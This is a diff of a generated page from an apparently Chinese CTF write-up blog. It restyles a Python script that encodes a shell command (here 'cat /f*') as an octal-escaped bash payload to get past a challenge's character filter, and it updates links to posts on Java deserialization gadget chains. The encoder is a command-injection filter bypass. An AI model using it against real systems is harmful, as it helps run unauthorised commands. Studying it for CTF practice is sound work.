@@ -436,7 +436,7 @@
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8581?time__1311=n4+xuDgDBDyDRnzD/D0YoQ+q7uI6aCiteD&alichlgref=https://cn.bing.com/#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0YoQ%2Bq7uI6aCiteD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3</a></p>
 <p>修改一下官方wp里的脚本。</p>
 <p>安洵杯2020 Web-Bash-Vino0o0o这个题数字需要自己构造，但是这里直接给了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">n = dict()</span><br><span class="line">n[0] = &#x27;0&#x27;</span><br><span class="line">n[1] = &#x27;1&#x27;</span><br><span class="line">n[2] = &#x27;2&#x27;</span><br><span class="line">n[3] = &#x27;3&#x27;</span><br><span class="line">n[4] = &#x27;4&#x27;</span><br><span class="line">n[5] = &#x27;5&#x27;</span><br><span class="line">n[6] = &#x27;6&#x27;</span><br><span class="line">n[7] = &#x27;7&#x27;</span><br><span class="line"></span><br><span class="line">f=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def str_to_oct(cmd):                                #命令转换成八进制字符串</span><br><span class="line">    s = &quot;&quot;</span><br><span class="line">    for t in cmd:</span><br><span class="line">        o = (&#x27;%s&#x27; % (oct(ord(t))))[2:]</span><br><span class="line">        s+=&#x27;\\&#x27;+o</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">def build(cmd):                                     #八进制字符串转换成字符</span><br><span class="line">    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span><br><span class="line">    s = str_to_oct(cmd).split(&#x27;\\&#x27;)</span><br><span class="line">    for _ in s[1:]:</span><br><span class="line">        payload+=&quot;\\\\&quot;</span><br><span class="line">        for i in _:</span><br><span class="line">            payload+=n[int(i)]</span><br><span class="line">    return payload+&#x27;\\\&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload=&quot;cat /f*&quot;</span><br><span class="line">print(build(payload))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /f*&quot;</span></span><br><span class="line"><span class="built_in">print</span>(build(payload))</span><br></pre></td></tr></table></figure>
 
 <p>打入payload一把嗦。</p>
 <h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>这个题原来的题目描述可没有”说英语”这三个字，真的谜语题了哈。</p>
@@ -527,6 +527,10 @@
 					
 	<span>
 		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="JAVA反序列化——CC6链" rel="prev">
+				&laquo;上一篇
+			</a>
 		
 		
 			<a href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链" rel="next">
@@ -780,25 +784,25 @@ EzHttp请post传参username和password进行登录
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">
-								JAVA反序列化——CC1链			
+							<a class="relate-post-title" href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="JAVA反序列化——CC6链">
+								JAVA反序列化——CC6链			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
-								四月 2日, 2024				
+								四月 10日, 2024				
 							</p>
 							<p class="relate-post-content">
-								前言CC1链有两种写法，我这种写法跟ysoserial里的写法不一样，另一种写法写在另一篇文章。
-cc1链要求java版本小于jdk8u71
-我这里用的JDK版本是8u66
-因为在高版本这条链子最后的annotationInvocat...
+								CC6链其实就是URLDNS链的前半加上CC1链的后半。
+
+链子构建入口类跟CC1链完全一致，这里不再赘述。
+在找哪里调用了ChainedTransformer.transform方法时，CC1链是找到了TransformedMap类...
 							</p>
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/" title="JAVA反序列化——CC1链">				
+							<a href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="JAVA反序列化——CC6链">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC1链"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="JAVA反序列化——CC6链"/>
 							</a>
 						</div>
 					</li>												
